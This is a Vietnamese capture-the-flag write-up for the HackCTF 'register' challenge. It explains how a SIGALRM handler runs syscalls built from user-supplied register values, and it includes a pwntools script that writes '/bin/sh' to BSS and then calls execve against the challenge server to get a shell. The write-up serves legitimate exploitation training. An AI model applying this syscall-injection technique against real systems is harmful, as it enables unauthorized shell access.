# Register
### Cre: Pyo Tutor

Hàm main sẽ setup Alarm(5) trước thi thực hiện function chính là Build() để thực thi.

![Đây là hàm Main](https://github.com/zirami/HackCTF/blob/main/register/image/main_func.png)


Tại hàm build(), signal sẽ được kích hoạt và gọi hàm handler để thực thi các tham số đã truyền trong obj.
Sau đó thực hiện 2 vòng while và Do while, nhận các tham số cho register.

![Đây là hàm build](https://github.com/zirami/HackCTF/blob/main/register/image/build%20func.png)
![Đây là hàm handler](https://github.com/zirami/HackCTF/blob/main/register/image/handler_func.png)


Trong hàm Do While có hàm validate_syscall_obj() để check điều kiện, với tham số đầu vào rơi vào RAX register.

![Đây là hàm Validate_syscal_obj](https://github.com/zirami/HackCTF/blob/main/register/image/validate_syscall_obj_func.png)

Chương trình sử dụng signal(14, handler); kèm theo alarm(5-seconds).
Sau đó, nhận các input cho các register của chương trình.
Vậy chỉ cần truyền các tham số hợp lí, thì có thể gọi shell.

# Solution

Có 2 công việc cần làm để gọi shell
* Tạo 1 nơi chứa chuỗi `/bin/sh`
* Truyền tham số cho RDI = addr("/bin/sh"), RAX = 59,... Đợi 5s.

## Getshell

![get_shell](https://github.com/zirami/HackCTF/blob/main/register/image/get_shell.png)


## File Exploit
```py
from pwn import * 
# s = process("./register")
s = remote('ctf.j0n9hyun.xyz', 3026)
# raw_input("debug")

binsh = "/bin/sh\x00"
#BSS_ADDR = 0x601100 = 6295808 
s.sendlineafter("RAX: ","0")
s.sendlineafter("RDI: ","0")
s.sendlineafter("RSI: ","6295808")
s.sendlineafter("RDX: ","8")
s.sendlineafter("RCX: ","0")
s.sendlineafter("R8: ","0")
s.sendlineafter("R9: ","0")

s.send(binsh)


s.sendlineafter("RAX: ","59")
s.sendlineafter("RDI: ","6295808")
s.sendlineafter("RSI: ","0")
s.sendlineafter("RDX: ","0")
s.sendlineafter("RCX: ","0")
s.sendlineafter("R8: ","0")
s.sendlineafter("R9: ","0")

sleep(4)

s.interactive()
```